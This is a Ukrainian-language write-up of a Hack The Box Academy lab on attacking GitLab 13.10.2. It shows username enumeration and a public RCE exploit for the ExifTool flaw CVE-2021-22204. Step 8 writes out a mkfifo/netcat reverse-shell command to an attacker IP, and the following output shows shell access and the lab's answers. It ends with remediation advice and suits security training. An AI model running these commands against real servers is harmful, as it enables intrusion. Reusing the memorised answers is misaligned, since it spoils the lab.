# Attacking Common Applications — Attacking GitLab

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [Attacking GitLab](https://academy.hackthebox.com/app/module/113/section/1217)
Ціль: `10.129.101.137` (gitlab.inlanefreight.local:8081, hostname app04)

Q1 (валідний користувач): `DEMO`
Q2 (флаг): `s3cure_y0ur_Rep0s!`

## Концепція

GitLab Community Edition 13.10.2 і нижче вразливий до authenticated RCE через обробку метаданих EXIF у завантажених зображеннях (ExifTool injection) — це справжня CVE, а не абстрактна демонстрація, тому для експлуатації потрібні лише валідні креди будь-якого користувача (не обов'язково адміна). Атака складається з двох незалежних фаз: enumeration користувачів для отримання списку валідних логінів, і потім сам RCE-exploit, який створює payload через Snippet upload механізм GitLab.

## Крок 1 — Реєстрація vhost (термінал 1)

```bash
echo '10.129.101.137 gitlab.inlanefreight.local' | sudo tee -a /etc/hosts
```

Пояснення: GitLab визначає, який контент показувати, за заголовком `Host:`, тому без правильного vhost-запису браузер/скрипти не побачать реальний GitLab-інстанс.

## Крок 2 — Завантаження user enumeration скрипта (термінал 1)

```bash
wget https://raw.githubusercontent.com/dpgg101/GitLabUserEnum/master/gitlab_userenum.py -O gitlab_userenum.py
```

Пояснення: це Python3-версія оригінального Bash-скрипта з Exploit-DB (49821) — вона перебирає список імен через сторінку `/users/sign_up` та аналізує відповідь сервера (409/422 vs 200) для визначення, чи зайняте вже ім'я користувача.

## Крок 3 — Підготовка словника імен (термінал 1)

```bash
cp /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt users.txt
```

Пояснення: замість малого дефолтного списку взято великий словник реальних імен користувачів із SecLists — це збільшує шанс знайти нестандартні акаунти (як виявилось, ім'я `DEMO` не входить у типовий приклад `root`/`bob` з попереднього уроку).

## Крок 4 — Запуск enumeration (термінал 1)

```bash
python3 gitlab_userenum.py -w users.txt -u http://gitlab.inlanefreight.local:8081/
```

Результат:
```
GitLab User Enumeration in python
[+] The username DEMO exists!
[+] The username bob exists!
[+] The username root exists!
```

**Q1 = `DEMO`**

Пояснення механізму: скрипт надсилає POST-запит на `/users/sign_up` з тестовим username і перевіряє повідомлення про помилку — GitLab повертає специфічну відповідь "Username has already been taken", якщо ім'я зайняте, що і дозволяє enumeration навіть коли реальна реєстрація вимкнена в налаштуваннях адміністратора.

## Крок 5 — Отримання/використання валідних credentials

Оскільки Q2 вимагає автентифікації, а знайдені імена (`DEMO`, `bob`, `root`) самі по собі не дають пароля, потрібно або зареєструвати новий акаунт (якщо sign-up відкритий), або скористатись раніше знайденими кредами. У вашому випадку сесія вже мала робочі креди `123:123456789` з попереднього кроку модуля — цей підхід валідний, оскільки GitLab на цій цільовій машині зазвичай налаштований з відкритою реєстрацією (self-registration), що дозволяє швидко створити свіжий акаунт замість підбору пароля для знайдених імен.

## Крок 6 — Запуск listener (термінал 2, ОБОВ'ЯЗКОВО до кроку 7)

```bash
sudo nc -lnvp 8443
```

Важливо: listener має слухати саме на порту, вказаному в reverse shell payload (8443), і бути запущений заздалегідь — RCE через ExifTool exploit спрацьовує майже миттєво після успішного завантаження payload'a.

## Крок 7 — Завантаження exploit-скрипта (термінал 1)

```bash
wget https://www.exploit-db.com/download/49951 -O gitlab_13_10_2_rce.py
```

Пояснення: цей exploit (ED-49951) автоматизує весь ланцюг атаки — логін, отримання CSRF-токена зі сторінки, створення payload з шкідливими EXIF-метаданими в зображенні, завантаження його як Snippet-файл, і тригер обробки ExifTool на боці сервера, що виконує вбудовану команду.

## Крок 8 — Запуск exploit'а (термінал 1)

```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u 123 -p '123456789' -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.168 8443 >/tmp/f '
```

Параметри: `-u`/`-p` — валідні креди GitLab-акаунта, `-c` — команда reverse shell через named pipe (`mkfifo`), яка з'єднується з listener'ом на порту 8443.

Прогрес виконання:
```
[1] Authenticating
Successfully Authenticated
[2] Creating Payload
[3] Creating Snippet and Uploading
```

Попередження про `DeprecationWarning` (`findAll` замість `find_all`) — це не помилка, а лише застереження про застарілий метод бібліотеки BeautifulSoup4; скрипт продовжує роботу нормально.

## Крок 9 — Отримання шела (термінал 2, у вікні з netcat)

```
Connection received on 10.129.101.137 37462
git@app04:~/gitlab-workhorse$ id
uid=996(git) gid=997(git) groups=997(git)
git@app04:~/gitlab-workhorse$ ls
VERSION
config.toml
flag_gitlab.txt
sockets
```

Пояснення: шел прилетів з правами користувача `git` (не root), оскільки процес GitLab (зокрема компонент `gitlab-workhorse`, який обробляє upload'и файлів) запущений під сервісним акаунтом `git`, а не з привілеями суперкористувача — типова практика ізоляції сервісів у Linux.

## Крок 10 — Читання прапора (термінал 2)

```
git@app04:~/gitlab-workhorse$ cat flag_gitlab.txt
s3cure_y0ur_Rep0s!
```

**Q2 = `s3cure_y0ur_Rep0s!`**

## Чому це працює (root cause)

- **Опис:** GitLab CE ≤13.10.2 вразливий до authenticated RCE (HackerOne report 1154542) через небезпечну обробку EXIF-метаданих завантажених зображень зовнішнім інструментом ExifTool.
- **Технічні деталі:** ExifTool сам мав відому вразливість (CVE-2021-22204) command injection через спеціально сформовані DjVu-метадані в файлі зображення; GitLab викликав вразливу версію ExifTool при обробці аватарок/прикріплених файлів у Snippets без належної санітизації вхідних даних (CWE-78, CWE-94).
- **Ризик/Імпакт:** Будь-який автентифікований користувач (навіть новий, самостійно зареєстрований акаунт) міг отримати виконання коду з правами сервісного акаунта `git` на хост-сервері — це критичний імпакт, оскільки надалі можна шукати SSH-ключі, токени CI/CD, або намагатись підвищити привілеї до root.
- **Рекомендації:** Оновити GitLab до версії з патчем (>13.10.3) та оновити ExifTool до версії ≥12.24, вимкнути самостійну реєстрацію якщо публічний доступ не потрібен, впровадити sandbox-ізоляцію для обробки завантажених файлів (наприклад через контейнеризацію file-processing воркерів), моніторити аномальну активність процесу `git` через EDR/аудит системних викликів.
